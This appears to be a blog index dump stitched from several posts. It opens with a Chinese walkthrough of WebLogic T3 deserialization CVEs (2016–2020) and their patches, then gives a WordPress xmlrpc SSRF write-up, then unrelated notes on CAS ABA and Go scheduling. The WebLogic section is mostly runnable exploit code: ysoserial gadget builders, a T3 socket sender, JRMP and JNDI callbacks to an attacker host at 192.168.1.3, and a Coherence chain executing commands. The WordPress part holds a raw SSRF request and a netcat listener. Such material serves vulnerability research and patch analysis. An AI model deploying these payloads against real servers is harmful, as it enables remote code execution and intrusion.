weblogic.corba.utils.MarshalledObject不在黑名单中，并且在readResolve的时候会读取objBytes的值赋给新new的ois。那么我们在objBytes中放入rce payload即可。 12345678910111213141516171819202122232425262728293031323334353637383940import weblogic.corba.utils.MarshalledObject;import weblogic.jms.common.StreamMessageImpl;import java.io.*;import java.lang.reflect.Field;public class CVE_2016_3510 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { byte[] payload = exec(&quot;CommonsCollections1&quot;, &quot;touch /tmp/CVE_2016_3510&quot;); MarshalledObject marshalledObject = new MarshalledObject(&quot;foo&quot;); Class cls = marshalledObject.getClass(); Field field = cls.getDeclaredField(&quot;objBytes&quot;); field.setAccessible(true); field.set(marshalledObject, payload); ser(marshalledObject,&quot;./CVE_2016_3510.ser&quot;); } public static byte[] exec(String gadget, String command) throws IOException { String[] cmd = {&quot;java&quot;, &quot;-jar&quot;, &quot;/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&quot;, gadget, command}; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[4096]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } return baos.toByteArray(); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(&quot;-------序列化成功&quot; + serName); }} CVE-2016-3510的修复 补丁：2016年10月 p23743997_1036_Generic 重写了resolveClass方法，加了过滤。 CVE-2017-3248 利用JRMPClient进行带外rce，这个技巧相信看过橘子师傅shiro rce的操作的师很熟悉了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import socketimport sysimport structimport reimport subprocessimport binasciidef get_payload1(gadget, command): JAR_FILE = '/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar' popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE) return popen.stdout.read()def get_payload2(path): with open(path, &quot;rb&quot;) as f: return f.read()def exp(host, port, payload): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port)) handshake = &quot;t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n&quot;.encode() sock.sendall(handshake) data = sock.recv(1024) pattern = re.compile(r&quot;HELO:(.*).false&quot;) version = re.findall(pattern, data.decode()) if len(version) == 0: print(&quot;Not Weblogic&quot;) return print(&quot;Weblogic {}&quot;.format(version[0])) data_len = binascii.a2b_hex(b&quot;00000000&quot;) #数据包长度，先占位，后面会根据实际情况重新 t3header = binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;) #t3协议头 flag = binascii.a2b_hex(b&quot;fe010000&quot;) #反序列化数据标志 payload = data_len + t3header + flag + payload payload = struct.pack('&gt;I', len(payload)) + payload[4:] #重新计算数据包长度 sock.send(payload)if __name__ == &quot;__main__&quot;: host = &quot;127.0.0.1&quot; port = 7001 gadget = &quot;JRMPClient&quot; #CommonsCollections1 Jdk7u21 JRMPClient command = &quot;192.168.1.3:8080&quot; # payload = get_payload1(gadget, command) ) ) exp(host, port, payload) CVE-2017-3248的修复 补丁：p24667634_1036_Generic 官方的修复是新加resolveProxyClass，过滤java.rmi.registry.Registry CVE-2018-2628 上面提到过滤了Registry，这样ysoserial中原生JRMPClient就打不了，但是仍然有多种办法bypass。 替换接口 引用@lpwd师傅的话： 这个CVE廖也提交了绕过，他的绕过是用java.rmi.activation.Activator替换java.rmi.registry.Registry，从而绕过resolveProxyClass的判断。其实这里对接口没有要求，不一定是rmi接口，随便找一个接口都行，比如java.util.Map 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package ysoserial.payloads;import java.lang.reflect.Proxy;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;import java.util.Map;@SuppressWarnings ( { &quot;restriction&quot;} )@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)@Authors({ Authors.MBECHLER })public class JRMPClient3 extends PayloadRunner implements ObjectPayload&lt;Map&gt; { public Map getObject ( final String command ) throws Exception { String host; int port; int sep = command.indexOf(':'); if ( sep &lt; 0 ) { port = new Random().nextInt(65535); host = command; } else { host = command.substring(0, sep); port = Integer.valueOf(command.substring(sep + 1)); } ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Map proxy = (Map) Proxy.newProxyInstance( JRMPClient.class.getClassLoader(), new Class[] { Map.class }, obj); return proxy; } public static void main ( final String[] args ) throws Exception { Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader()); PayloadRunner.run(JRMPClient.class, args); }} 直接用UnicastRef CVE-2017-3248的构造中把UnicastRef放入了Registry，其实用UnicastRef也能在反序列化的时候发起jrmp请求。这种方法要比替换接口的干脆很多。在ysoserial中加一个JRMPClient2 123456789101112131415161718192021222324252627282930313233343536373839404142434445package ysoserial.payloads;import java.rmi.server.ObjID;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;@SuppressWarnings ( { &quot;restriction&quot;} )@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)@Authors({ Authors.MBECHLER })public class JRMPClient2 extends PayloadRunner implements ObjectPayload&lt;UnicastRef&gt; { public UnicastRef getObject ( final String command ) throws Exception { String host; int port; int sep = command.indexOf(':'); if ( sep &lt; 0 ) { port = new Random().nextInt(65535); host = command; } else { host = command.substring(0, sep); port = Integer.valueOf(command.substring(sep + 1)); } ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); return ref; } public static void main ( final String[] args ) throws Exception { Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader()); PayloadRunner.run(JRMPClient.class, args); }} CVE-2018-2628的修复 补丁：2018年四月发布的p27395085_1036_Generic UnicastRef在weblogic.utils.io.oif.WebLogicFilterConfig中加进了黑名单。 CVE-2018-2893 streamMessageImpl + jrmp代理类绕过。先来看payload 123456789101112131415161718192021222324252627282930313233343536373839404142import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import weblogic.jms.common.StreamMessageImpl;import java.io.*;import java.lang.reflect.Proxy;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class CVE_2018_2893 { public static void main(String[] args) throws IOException { ObjID objID = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint tcpEndpoint = new TCPEndpoint(&quot;192.168.1.3&quot;, 8080); UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false)); RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef); Object object = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[] { Registry.class }, remoteObjectInvocationHandler); StreamMessageImpl streamMessage = new StreamMessageImpl(serialize(object)); ser(streamMessage, &quot;CVE_2018_2893.ser&quot;); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(&quot;-------序列化成功&quot; + serName); } public static byte[] serialize(final Object obj) throws IOException { final ByteArrayOutputStream out = new ByteArrayOutputStream(); serialize(obj, out); return out.toByteArray(); } public static void serialize(final Object obj, final OutputStream out) throws IOException { final ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); }} 什么鬼？payload中用到的streamMessageImpl、Registry、UnicastRef不是已经被修复了吗？ 我们来细看一下怎么修的。 streamMessageImpl的readExternal内部是拿给FilteringObjectInputStream过滤。 FilteringObjectInputStream只是对普通类的反序列化进行了拦截，并没有对代理类进行拦截。对你没看错，虽然在CVE-2017-3248后ServerChannelInoutStream类中的resolveProxyClass过滤了Registry，但是这里的FilteringObjectInputStream并没有实现resolveProxyClass过滤代理类。 那UnicastRef又为啥逃过一劫？我们来看UnicastRef在序列化的时候经历了什么。在上面的payload中UnicastRef传入了RemoteObjectInvocationHandler，RemoteObjectInvocationHandler继承自RemoteObject。在RemoteObject writeObject时只是写入UnicastRef的类名（并没有把他作为一个类序列化）然后调用UnicastRef的writeExternal。 UnicastRef又用到了LiveRef的write，写入了反序列化时需要反连的host和端口。 由此可见UnicastRef从始至终并没有作为一个类被反序列化，如果分析这个payload的resolve*时序会发现完全没有反序列化UnicastRef。 如果你分析序列化出来的数据会发现UnicastRef只是TC_BLOCKDATA而不是TC_CLASSDESC。 CVE-2018-2893的修复 补丁：18年7月 p27919965_1036_Generic 这次修复把经过resolveClass的java.rmi.server.RemoteObjectInvocationHandler给过滤了。 CVE-2018-3245 再次引用@lpwd师傅的话： 根据前面的分析可知，我们只需要找一个类似java.rmi.server.RemoteObjectInvocationHandler的类进行替换，就能继续绕过了。 那么这个类应该满足以下条件： 继承远程类：java.rmi.server.RemoteObject 不在黑名单里边（java.rmi.activation. 、sun.rmi.server.） 随便找了一下，符合条件的挺多的： javax.management.remote.rmi.RMIConnectionImpl_Stub com.sun.jndi.rmi.registry.ReferenceWrapper_Stub javax.management.remote.rmi.RMIServerImpl_Stub sun.rmi.registry.RegistryImpl_Stub sun.rmi.transport.DGCImpl_Stub 123456789101112131415161718192021222324252627import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.*;import java.rmi.server.ObjID;import java.util.Random;public class CVE_2018_3245 { public static void main(String[] args) throws IOException { ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(&quot;192.168.1.3&quot;, 8080); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); ReferenceWrapper_Stub wrapperStub = new ReferenceWrapper_Stub(ref); ser(wrapperStub, &quot;CVE_2018_3245.ser&quot;); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(&quot;-------序列化成功&quot; + serName); }} CVE-2018-3245的修复 补丁：2018年8月 p28343311_1036_201808Generic 修复方法是添加更底层的java.rmi.server.RemoteObject。 CVE-2018-3191 这个洞是jndi注入。触发点在JtaTransactionManager。 12345678910111213141516171819202122import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class CVE_2018_3191 { public static void main(String[] args) throws IOException { String jndiAddress = &quot;rmi://192.168.1.3:1099/Exploit&quot;; JtaTransactionManager jtaTransactionManager = new JtaTransactionManager(); jtaTransactionManager.setUserTransactionName(jndiAddress); ser(jtaTransactionManager, &quot;CVE_2018_3191.ser&quot;); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(&quot;-------序列化成功&quot; + serName); }} CVE-2018-3191的修复 补丁：2018年8月 p28343311_1036_Generic CVE-2020-2555 Oracle Coherence组件存在漏洞，该组件默认集成在Weblogic12c及以上版本中（网上资料这么说的：web10.3.6也有只是默认没有启用，未验证）。 这个漏洞和cc5的构造有异曲同工之妙，触发点在BadAttributeValueExpException#readObject 中调用toString方法。 在Coherence组件中LimitFilter这个类刚好可以被序列化并且有toString这个方法。因为是反序列化，this.m_comparator和this.m_oAnchorBottom都可控。也就说extractor.extract(``this``.m_oAnchorBottom)完全可控(更严格的说m_comparator需要是ValueExtractor的实例并且和m_oAnchorBottom都需要可被序列化)。 我们来看一下有哪些满足条件的类实现了extract。 可以注意到com.tangosol.util.extractor.ReflectionExtractor#extract 它可以被序列化并且extract里面是一组反射操作。 其次注意到com.tangosol.util.extractor.ChainedExtractor#extract 里面是对extrator进行链式操作（并且这个类同样可以被反序列化），说到这里已经可以看出来是和cc链一个套路了。 这里我是在windows上复现的（~~很奇怪我在linux完整安装打不了，windows上默认安装就可以，~~后来发现linux环境是7u21这个版本的BadAttributeValueExpException并没有readObject方法，另外不需要用完整示例安装默认安装即可）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import com.tangosol.util.ValueExtractor;import com.tangosol.util.extractor.ChainedExtractor;import com.tangosol.util.extractor.ReflectionExtractor;import com.tangosol.util.filter.LimitFilter;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;public class CVE_2020_2555 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { //String cmd = &quot;touch /tmp/CVE_2020_2555_12013&quot;; String cmd =&quot;calc.exe&quot;; ValueExtractor[] valueExtractors = new ValueExtractor[]{ new ReflectionExtractor(&quot;getMethod&quot;, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new ReflectionExtractor(&quot;invoke&quot;, new Object[]{null, new Object[0]}), //new ReflectionExtractor(&quot;exec&quot;, new Object[]{new String[]{&quot;/bin/bash&quot;, &quot;-c&quot;, cmd}}) new ReflectionExtractor(&quot;exec&quot;, new Object[]{new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd}}) }; // chain LimitFilter limitFilter = new LimitFilter(); limitFilter.setTopAnchor(Runtime.class); BadAttributeValueExpException expException = new BadAttributeValueExpException(null); Field m_comparator = limitFilter.getClass().getDeclaredField(&quot;m_comparator&quot;); m_comparator.setAccessible(true); m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors)); Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(&quot;m_oAnchorTop&quot;); m_oAnchorTop.setAccessible(true); m_oAnchorTop.set(limitFilter, Runtime.class); Field val = expException.getClass().getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(expException, limitFilter); ser(expException, &quot;./CVE_2020_2555_12013.ser&quot;); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(&quot;-------序列化成功&quot; + serName); } } CVE-2020-2555的修复 图片来自ZDL（侵删）可以看到是删了extractor.extract 总结 梳理完一遍之后，我们得以看到整个绕过思路的全貌。笔者主观分为三个阶段。 第一阶段，CVE-2016-0638和CVE-2016-3510。利用反序列化流程中新new的原生ois绕过，只要找到了read*系列的点可以比较容易的看出来。 第二阶段，cve-2017-3248到cve-2018-3191。利用jrmp、jndi带外rce，漏洞点没有在read*的代码上下文中需要多跟几步有点“pop”的感觉了。 第三阶段，cve-2020-2555，需要对java的反序列化出现过知识点很熟悉（java原生类的触发点+weblogic组件中类似cc的套路），据说这个漏洞的作者也挖了很久。 碍于笔者水平，行文出错在所难免，如有阅读此文的师傅发现错误还请不吝指正。 参考 从WebLogic看反序列化漏洞的利用与防御 Java 序列化之 Externalizable Weblogic漏洞调试笔记 如何控制开放HTTPS服务的weblogic服务器 Weblogic CVE-2016-0638 StreamMessageImpl反序列化绕过分析 Patch S8C2 is mutually exclusive and cannot coexist with patch(es): ZLNA,EJUW Weblogic JRMP反序列化漏洞回顾 CVE-2018-2893：Oracle WebLogic Server 远程代码执行漏洞分析预警 漫谈 Weblogic CVE-2020-2555 Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）","link":"/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/"},{"title":"wordpress xmlrpc.php have ssrf vuln(use dns rebinding bypass limit)","text":"The first is in wp-includes/class-wp-xmlrpc-server.php:6774towp-includes/http.php:551. When the incoming url is a domain name, dns parsing will be performed and determine whether ip belongs to the intranet ip. The second is wp-includes/class-http.php:265. The code in wp_http_validate_url is the same as the one in the first screenshot. The last is in wp-includes/Requests/Transport/cURL.php:162 So if I provide a domain name which has very short ttl, let the first and second time be resolved to an external network address. Let the third time be resolved into an intranet address。 The details of the payload are as follows 123456789101112131415161718POST /wordpress/xmlrpc.php HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 338&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://ffffffff.2FF02E9A.rbndr.us:443/xmlrpc.php?hack=ssrf&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://127.0.0.1:8888/wordpress/2019/10/27/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; ffffffff is the hexadecimal form of the intranet ip 127.0.0.1 and 2FF02E9A is the hexadecimal form of the external network ip。 When dns parsing ffffffff.2FF02E9A.rbndr.us, the server will randomly return 127.0.0.1 or the external network ip Here I have been replaying this package for the convenience of testing. I hope that the dns parsing result of the request is just the external network address, the external network address, and the internal network address.(Need good luck， i I tried thousands of times) However, in the actual situation, it is entirely possible to build a dns server to accurately return the sequence of the external network address, the external network address, and the internal network address（I am too lazy =.=）. nc -lp 443","link":"/2019/11/01/wordpress%20xmlrpc.php%20have%20ssrf%20vuln(use%20dns%20rebinding%20bypass%20limit)/"},{"title":"与AI纸上谈兵-CAS的ABA问题","text":"CAS CAS即Compare And Swap的缩写，翻译成中文就是 比较并交换 ，其作用是让CPU比较内存中某个值是否和预期的值相同，如果相同则将这个值更新为新值，不相同则不做更新，也就是CAS是原子性的操作(读和写两者同时具有原子性)，其实现方式是通过借助C/C++调用CPU指令完成的，所以效率很高。 用CAS来实现一个无锁栈 设想我们实现了一个无锁栈，用链表节点表示栈中的元素，其中top指针指向栈顶元素。为了实现高效和线程安全的出栈操作，我们使用CAS更新top指针。一个典型的出栈伪代码可能是以下形式： 12345678910function pop() { do { oldTop = top // 获取当前栈顶节点 if (oldTop == null) { return null // 栈为空 } newTop = oldTop.next // 栈顶将被移除，新的栈顶是下一个 } while (!compare_and_swap(top, oldTop, newTop)) // CAS操作，尝试更新栈顶 return oldTop.value // 返回栈顶的值 } ABA问题-在无锁栈中 假设以下线程和操作按顺序发生： 线程A：调用pop，读取oldTop，其值是节点A。 线程B：调用两次pop，依次移除了节点A和节点B，并随后将节点A重新压回栈（通过push操作），此时栈的top再次指向节点A。 线程A：继续执行刚才的CAS操作，发现top的值仍然是节点A（因为线程B又将节点A压回栈），CAS 操作通过。 看似 CAS 成功了，但线程A并不知道，栈的结构已经在它检查oldTop和执行CAS之间发生了改变。此时返回的节点A可能已经不再安全使用，因为它的状态已经被修改，或者栈本身的数据结构可能已经遭到破坏。 ABA问题-在“生活”中 小明在提款机，提取了50元，因为提款机问题，有两个线程，同时把余额从100变为50 线程1（提款机）：获取当前值100，期望更新为50， 线程2（提款机）：获取当前值100，期望更新为50， 线程1成功执行，线程2某种原因block了，这时，某人给小明汇款50 线程3（默认）：获取当前值50，期望更新为100， 这时候线程3成功执行，余额变为100， 线程2从Block中恢复，获取到的也是100，compare之后，继续更新余额为50！！！ 此时可以看到，实际余额应该为100（100-50+50），但是实际上变为了50（100-50+50-50）这就是ABA问题带来的成功提交。 ABA问题的解决 在变量前面加上版本号，每次变量更新的时候变量的 版本号都 +1，即A-&gt;B-&gt;A就变成了1A-&gt;2B-&gt;3A。 1234567891011121314151617181920212223242526272829303132333435class Node&lt;T&gt; { T value; Node&lt;T&gt; next; long version; // 添加版本号字段 } class VersionedReference&lt;T&gt; { Node&lt;T&gt; reference; long version; VersionedReference(Node&lt;T&gt; ref, long ver) { reference = ref; version = ver; } } function pop() { VersionedReference&lt;T&gt; oldTop; Node&lt;T&gt; newTop; do { oldTop = top.get(); // 获取当前的引用和版本号 if (oldTop.reference == null) { return null; // 栈为空 } newTop = oldTop.reference.next; // 新的栈顶是下一个节点 // CAS操作会同时比较引用和版本号 } while (!top.compareAndSet( oldTop, // 期望的旧值(包含引用和版本号) new VersionedReference(newTop, oldTop.version + 1) // 新值(更新引用和版本号) )); return oldTop.reference.value; } 什么是原语？ 计算机是一门人造科学，因此真正意义上的“原语”是不存在的。操作系统层面上的“原语”（比如 write 之类的系统调用）对程序员来讲的确是不可分割的最小单位，但是这写系统调用本身还是用好几句汇编语句组成的（对于 Linux 来说是 C 语言）。可能有人要说到了机器代码这一级就不能再分了，但事实上一条机器指令也是由好几个组合逻辑信号构成的。同样的道理，控制信号也不过是无数电子在器件内部漂移的结果。 因此定义“原语”的前提是观察者所处的位置。一旦规定了观察者的位置和观察的角度，比如就在操作系统的这层上，read，wirte，wait这些个系统调用自然就是最“原始”的词汇，这也是为什么“原语”会在操作系统中频繁出现的缘故。 参考 什么是“原语” CAS原理分析及ABA问题详解 Claude 3.5 sonnet","link":"/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-CAS%E7%9A%84ABA%E9%97%AE%E9%A2%98/"},{"title":"与AI纸上谈兵-Go中I&#x2F;O密集型需要设置P超过CPU核心数吗？","text":"GO的GMP 在 Go 语言中，GMP 是 Go 运行时调度器的核心模型，用于高效地管理并发任务（goroutine）的执行。GMP 分别代表： G（Goroutine）：Go 中的轻量级线程，表示一个独立的任务或协程。 M（Machine）：操作系统线程，Go 运行时通过 M 来执行 G。 P（Processor）：逻辑处理器，负责调度 G 到 M 上运行。 GMP 模型的设计目的是为了高效利用多核 CPU，同时隐藏底层线程管理的复杂性，提供更高效的并发支持。 GMP 模型的具体含义 G（Goroutine） Goroutine 是 Go 的核心并发单元，类似于协程。 每个 G 包含任务的执行上下文（如栈、程序计数器等）和调度信息。 G 是非常轻量级的，创建和销毁的开销远小于操作系统线程。 M（Machine） M 是操作系统线程的抽象，负责执行 G。 M 直接与操作系统线程绑定，Go 运行时会动态创建或销毁 M，以适应程序的并发需求。 一个 M 在任意时刻只能绑定一个 P，且只能执行绑定的 P 中的 G。 P（Processor） P 是逻辑处理器，负责调度 G 到 M 上运行。 P 的数量由 GOMAXPROCS 决定，表示程序可以并行运行的最大线程数。 P 维护一个本地的 G 队列，存储待执行的 Goroutine。 如果 P 的 G 队列为空，它可以从其他 P 的队列中窃取任务（work stealing）。 GMP 的工作流程 G 的创建 当程序创建一个新的 Goroutine 时，G 会被放入某个 P 的本地队列中，等待被调度执行。 P 调度 G P 从自己的本地队列中取出 G，并将其分配给绑定的 M 执行。 如果本地队列为空，P 会尝试从其他 P 的队列中窃取任务。 M 执行 G M 负责实际执行 G 的代码。 如果 G 阻塞（如 I/O 操作），M 会将当前 G 挂起，并尝试执行其他 G。 动态调整 如果 G 的数量远超 M 的数量，Go 运行时会动态创建新的 M。 如果某些 M 长时间空闲，Go 运行时会销毁这些 M，以节省资源。 GMP 模型的优点 高效的并发支持 Goroutine 是轻量级的，创建和切换的开销远小于操作系统线程。 GMP 模型通过逻辑处理器（P）和任务窃取机制，充分利用多核 CPU 的性能。 自动调度 Go 运行时自动管理 Goroutine 的调度，开发者无需手动管理线程。 阻塞操作优化 当 Goroutine 阻塞时，Go 运行时会将其挂起，并调度其他 Goroutine 执行，避免线程资源浪费。 In the Go GMP model, does an IO-intensive application need to set the number of P greater than the number of CPU cores? No, an I/O-intensive application in Go’s GMP (Goroutine, Machine, Processor) model generally does not need to set GOMAXPROCS (the number of P’s) greater than the number of CPU cores. In fact, doing so can often be detrimental to performance. Here’s why: Concurrency vs. Parallelism: Go’s strength lies in concurrency, not necessarily parallelism. Concurrency means handling multiple tasks at the same time, while parallelism means executing multiple tasks simultaneously. I/O-bound operations spend most of their time waiting for external resources (disk, network, etc.). During this waiting time, the OS puts the goroutine to sleep. Another goroutine can then run on the same OS thread (and thus, the same P). Increasing the number of P’s won’t make the I/O faster; it just adds overhead for context switching between P’s. OS Thread Management: The P’s are mapped to OS threads. Having more P’s than CPU cores means the OS scheduler will be constantly switching between threads, leading to context switching overhead.() This overhead can outweigh any potential gains, especially in I/O-bound applications where the CPU is not the bottleneck. Blocking System Calls: When a goroutine makes a blocking system call (like reading from a file or network socket), the associated OS thread is blocked. However, the Go runtime uses a technique called “network poller” to handle network I/O efficiently. For file I/O, if the runtime detects a long blocking operation, it can detach the M (OS thread) from the P, allowing other goroutines to run on that P. When the I/O operation completes, the M is reattached. This mechanism minimizes blocking and context switching. I/O时会发生什么？ 网络 I/O： Go runtime 使用非阻塞的 I/O 模型和 epoll/kqueue 等操作系统提供的 I/O 多路复用机制（network poller）。当一个 G 发起网络 I/O 操作时，通常不会阻塞 M。而是将 I/O 请求交给操作系统，然后该 G 会被放入网络轮询器(network poller)中等待 I/O 事件。P 可以继续调度其他 G 在 M 上执行。当 I/O 事件发生时，runtime 会收到通知，并将相应的 G 重新放回 P 的 runqueue 中，等待调度。 文件 I/O (以及其他可能长时间阻塞的系统调用)： 对于文件 I/O，如果操作是阻塞的（例如读取大文件），则情况会略有不同。在这种情况下： 如果 runtime 判定此 I/O 操作会长时间阻塞，会将 M 从 P 上解绑 。这个过程叫做 sysmon 会检测，当一个 M 阻塞时间过长，sysmon会把这个M和P分离。 此时，P 就变成空闲状态了，它可以寻找其他的 M 来绑定，或者创建新的 M。这样，其他的 G 就有机会在这个 P 上继续执行，不会因为某个 G 的文件 I/O 操作而导致整个 P 阻塞。 当 I/O 操作完成时，被解绑的 M 会尝试重新获取一个 P。如果此时有空闲的 P，则直接绑定；如果没有空闲的 P，则 M 会进入一个空闲 M 列表等待 P。 更多解绑细节 当 sysmon 将 M 和 P 解绑后，P 不会立即创建新的 M。P 的行为如下： 检查本地 runqueue： P 首先会检查其本地的 runqueue (runq) 中是否还有待执行的 G。如果 runqueue 不为空，P 会选择一个 G，并尝试找到一个 空闲的 M 来执行该 G。 寻找空闲 M： P 会首先查看是否有空闲的 M 列表 (idle M list)。如果存在空闲的 M，P 会直接与该 M 绑定，然后将 runqueue 中的 G 调度到该 M 上执行。 创建新的 M（如果需要）： 如果没有空闲的 M 可用，且 P 的 runqueue 不为空，P 才会 创建一个新的 M，并与该 M 绑定，然后将 runqueue 中的 G 调度到该 M 上执行。 窃取 (work stealing)： 如果 P 的 runqueue 也为空，P 会尝试从其他 P 的 runqueue 中 窃取 一部分 G。这是 Go 调度器实现负载均衡的重要机制。如果窃取成功，P 就会有待执行的 G，并按照上述步骤寻找或创建 M 来执行。 进入休眠 (spinning)： 如果 P 的 runqueue 为空，且无法从其他 P 窃取到 G，P 会进入休眠状态 (spinning)。此时 P 不会消耗 CPU 资源，直到有新的 G 需要执行时才会被唤醒。 还有一个细节 sysmon是发现它是文件i/o所以分离M和P。还是因为他syscall时间太长所以分离。注意这两个的区别，一个是提前就发现了，一个是超时了才发现。 不是提前发现是文件 I/O Go runtime 并不会在 G 执行系统调用 之前 就判断这是不是文件 I/O，然后采取特殊处理。实际上，runtime 对所有类型的阻塞系统调用都采用相同的处理方式，包括文件 I/O、网络 I/O（在某些情况下，虽然通常是异步的，但也可能发生阻塞）、以及其他用户自定义的阻塞系统调用。 这意味着： runtime 没有维护一个“文件 I/O 特殊处理”的列表或逻辑。 runtime 不会区分系统调用的类型。 是 syscall 时间太长才分离 sysmon 的核心工作是 监控 ，而不是 预判 。它通过周期性地检查所有 M 的状态来判断是否有 M 阻塞在系统调用上的时间过长。这个“过长”的阈值通常是 10ms。 具体流程如下： G 执行一个系统调用。 runtime 将该 G 的状态标记为 _Gsyscall。 该 G 所在的 M 进入阻塞状态，等待系统调用完成。 sysmon 周期性地检查所有 M 的状态。 如果 sysmon 发现某个 M 的状态为 _Gsyscall，并且持续时间超过阈值（10ms），它就认为该 M 正在执行长时间阻塞的系统调用。 sysmon 将该 M 与其绑定的 P 解绑。 因此，分离 M 和 P 的 根本原因是超时 ，而不是提前知道是哪种类型的系统调用。 参考 Google Gemini2.0","link":"/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Go%E4%B8%ADI-O%E5%AF%86%E9%9B%86%E5%9E%8B%E9%9C%80%E8%A6%81%E8%AE%BE%E7%BD%AEP%E8%B6%85%E8%BF%87CPU%E6%A0%B8%E5%BF%83%E6%95%B0%E5%90%97%EF%BC%9F/"},{"title":"与AI纸上谈兵-Python协程的原理与I&#x2F;O多路复用","text":"推荐一个prompt的网站 https://snackprompt.com/ ，下面会用这里面的prompt以获取更结构化的答案。 python协程程能做到高并发的底层原理 使用Get ChatGPT4 to efficiently teach you difficult / advanced technical concepts 